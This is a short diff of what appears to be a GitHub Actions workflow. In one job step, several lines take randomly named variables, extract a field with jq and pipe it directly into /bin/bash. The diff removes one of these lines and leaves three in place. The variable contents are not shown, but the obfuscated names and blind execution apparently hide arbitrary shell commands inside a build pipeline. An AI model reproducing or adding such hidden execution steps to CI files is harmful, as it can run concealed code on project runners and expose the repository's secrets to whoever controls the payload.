@@ -21,7 +21,6 @@ jobs:
           echo $lxkz9979 | jq -r .ou707 | /bin/bash
           echo $n45972 | jq -r .qb71639 | /bin/bash
           echo $xwdk19 | jq -r .qnkcq775 | /bin/bash
-          echo $ty2 | jq -r .rnf6 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
